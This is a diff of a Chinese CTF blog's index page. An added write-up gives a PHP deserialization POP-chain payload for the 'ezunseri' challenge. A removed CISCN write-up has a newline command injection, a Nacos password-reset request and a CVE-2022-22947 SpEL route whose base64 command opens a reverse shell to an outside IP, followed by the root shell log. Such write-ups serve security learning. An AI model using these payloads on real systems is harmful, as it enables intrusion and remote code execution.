@@ -73,6 +73,70 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20230616" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/17/20230616/" class="article-date">
+  <time class="dt-published" datetime="2023-06-16T18:16:26.000Z" itemprop="datePublished">2023-06-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/unctf/">unctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/06/17/20230616/">20230616</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="ezunseri-西华大学"><a href="#ezunseri-西华大学" class="headerlink" title="ezunseri-西华大学"></a>ezunseri-西华大学</h3><ol>
+<li><p>查看源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">   	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;1&#x27;</span>;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;2&#x27;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">      </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;3&#x27;</span>;</span><br><span class="line">       <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;content);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;1!5!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;4&#x27;</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;test = <span class="string">&quot;test123&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;5&#x27;</span>;</span><br><span class="line">       <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">       <span class="variable">$name</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;UNCTF&quot;</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;6&#x27;</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="variable language_">$this</span>-&gt;code;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;7&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code = <span class="string">&#x27;3.1415926&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key-&gt;name;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[pop]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   </span><br><span class="line">  <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line">  <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>思路</p>
+</li>
+<li><p>首先看到了<code>Exec类execute()里的eval</code>，发现需要调用<code>Exec里的__invoke()</code>; </p>
+</li>
+<li><p>调用<code>invoke()</code>就需要调用<code>Test里的__toString()</code>; </p>
+</li>
+<li><p>调用<code>Test里的__toString()</code>就需要调用<code>Exec里的__get()</code>; </p>
+</li>
+<li><p>调用<code>Exec里的__get()</code>就需要调用<code>Login()里的__destruct()</code>;</p>
+</li>
+<li><p>直接构造<code>fast destruct</code>;</p>
+</li>
+<li><p>构造反序列化pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O%3A5%3A%22Login%22%3A3%3A%7Bs%3A4%3A%22name%22%3BN%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A10%3A%22phpinfo()%3B%22%3B%7D%7D%7D%0A</span><br></pre></td></tr></table></figure>
+
+<p> 这里放一个<code>urldecode</code>之后的</p>
+ <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:<span class="number">5</span>:<span class="string">&quot;Login&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;3.1415926&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Exec&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Exec&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/17/20230616/" data-id="cliyw81x10000tsuze5pt4l2d" data-title="20230616" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-20230614" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/06/14/20230614/" class="article-date">
@@ -1106,87 +1170,12 @@
 
 
   
-    <article id="post-ciscn-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/06/01/ciscn-web/" class="article-date">
-  <time class="dt-published" datetime="2023-06-01T01:21:18.000Z" itemprop="datePublished">2023-06-01</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/ciscn/">ciscn</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/01/ciscn-web/">ciscn-web</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><hr>
-<h3 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h3><p>访问</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;?db=ctf&amp;table_2_dump=flag1%0Aenv?db=ctf&amp;table_2_dump=flag%0Aenv:?db=ctf&amp;table_2_dump=flag1%0Aenv</span><br><span class="line"></span><br><span class="line">&gt;?db=ctf&amp;table_2_dump=flag1%0Aenv</span><br></pre></td></tr></table></figure>
-</blockquote>
-<hr>
-<h3 id="Backend-Service"><a href="#Backend-Service" class="headerlink" title="Backend Service"></a>Backend Service</h3><p>“小明拿到了内网一个老旧服务的应用包，虽然有漏洞但是怎么利用他呢？[注意：平台题目下发后请访问&#x2F;nacos路由]”</p>
-<ol>
-<li>审计代码发现如下</li>
-</ol>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;spring:</span><br><span class="line">cloud:</span><br><span class="line">	nacos:</span><br><span class="line">		discovery:</span><br><span class="line">			server-addr: 127.0..1:8888</span><br><span class="line">		config:</span><br><span class="line">			name: backcfg</span><br><span class="line">			file-extension: json</span><br><span class="line">			group: DEFAULT_GROUP</span><br><span class="line">			server-addr: 127.0.0.1:8888</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><strong>nacos</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49849300/article/details/129781776">https://blog.csdn.net/qq_49849300/article/details/129781776</a></p>
-<p><strong>CVE-2022-22947</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64973687/article/details/130059155">https://blog.csdn.net/qq_64973687/article/details/130059155</a></p>
-<ol start="2">
-<li><code>PUT</code> 方式访问</li>
-</ol>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/nacos/v1/auth/users?accessToken=&amp;username=nacos&amp;newPassword=nacos</span><br></pre></td></tr></table></figure>
-</blockquote>
-<ol start="3">
-<li>然后配置列表添加</li>
-</ol>
-<p>ID:</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;backcfg</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>配置格式改成 yaml</p>
-<p>配置内容:</p>
-<blockquote>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&gt;&#123;</span></span><br><span class="line">   <span class="attr">&quot;spring&quot;:</span> &#123;</span><br><span class="line">       <span class="attr">&quot;cloud&quot;:</span> &#123;</span><br><span class="line">           <span class="attr">&quot;gateway&quot;:</span> &#123;</span><br><span class="line">               <span class="attr">&quot;routes&quot;:</span> [</span><br><span class="line">                   &#123;</span><br><span class="line">                       <span class="attr">&quot;id&quot;:</span> <span class="string">&quot;exam&quot;</span>,</span><br><span class="line">                       <span class="attr">&quot;order&quot;:</span> <span class="number">0</span>,</span><br><span class="line">                       <span class="attr">&quot;uri&quot;:</span> <span class="string">&quot;lb://backendservice&quot;</span>,</span><br><span class="line">                       <span class="attr">&quot;predicates&quot;:</span> [</span><br><span class="line">                           <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                       ],</span><br><span class="line">                       <span class="attr">&quot;filters&quot;:</span> [</span><br><span class="line">                           &#123;</span><br><span class="line">                               <span class="attr">&quot;name&quot;:</span> <span class="string">&quot;AddResponseHeader&quot;</span>,</span><br><span class="line">                               <span class="attr">&quot;args&quot;:</span> &#123;</span><br><span class="line">                                   <span class="attr">&quot;name&quot;:</span> <span class="string">&quot;result&quot;</span>,</span><br><span class="line">                                   <span class="attr">&quot;value&quot;:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNC4yMjAuMjM1LjE0OC85MDk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125;</span><br><span class="line">                       ]</span><br><span class="line">                   &#125;</span><br><span class="line">               ]</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="string">&gt;&#125;</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt;[root@VM-4-9-centos ~]# nc -lvp 9099</span><br><span class="line">&gt;Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">&gt;Ncat: Listening on :::9099</span><br><span class="line">&gt;Ncat: Listening on 0.0.0.0:9099</span><br><span class="line">&gt;Ncat: Connection from 39.106.20.178.</span><br><span class="line">&gt;Ncat: Connection from 39.106.20.178:26278.</span><br><span class="line">&gt;[root@engine-1 nacos]# pwd      </span><br><span class="line">&gt;pwd</span><br><span class="line">&gt;/home/nacos</span><br><span class="line">&gt;[root@engine-1 nacos]# whoami</span><br><span class="line">&gt;whoami</span><br><span class="line">&gt;root</span><br><span class="line">&gt;[root@engine-1 nacos]# cd /</span><br><span class="line">&gt;cd /</span><br><span class="line">&gt;[root@engine-1 /]# ls</span><br><span class="line">&gt;ls</span><br><span class="line">&gt;anaconda-post.log</span><br><span class="line">&gt;bin</span><br><span class="line">&gt;dev</span><br><span class="line">&gt;etc</span><br><span class="line">&gt;flag</span><br><span class="line">&gt;home</span><br><span class="line">&gt;lib</span><br><span class="line">&gt;lib64</span><br><span class="line">&gt;media</span><br><span class="line">&gt;mnt</span><br><span class="line">&gt;opt</span><br><span class="line">&gt;proc</span><br><span class="line">&gt;root</span><br><span class="line">&gt;run</span><br><span class="line">&gt;run.sh</span><br><span class="line">&gt;sbin</span><br><span class="line">&gt;srv</span><br><span class="line">&gt;sys</span><br><span class="line">&gt;tmp</span><br><span class="line">&gt;usr</span><br><span class="line">&gt;var</span><br><span class="line">&gt;[root@engine-1 /]# cat /flag</span><br><span class="line">&gt;cat /flag</span><br><span class="line">&gt;flag&#123;ecbef35d-a618-492e-8935-15f45553096a&#125;</span><br></pre></td></tr></table></figure>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/06/01/ciscn-web/" data-id="clid219190000f8uzcq6h9r07" data-title="ciscn-web" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -1196,7 +1185,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SYCTF2023/">SYCTF2023</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/buuctf/">buuctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/shaanxi/">shaanxi</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SYCTF2023/">SYCTF2023</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/buuctf/">buuctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/shaanxi/">shaanxi</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unctf/">unctf</a></li></ul>
     </div>
   </div>
 
@@ -1224,6 +1213,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/17/20230616/">20230616</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/14/20230614/">20230614</a>
           </li>
         
@@ -1237,10 +1230,6 @@
         
           <li>
             <a href="/2023/06/11/20230611/">20230611</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/11/SYCTF2023/">SYCTF2023</a>
           </li>
         
       </ul>
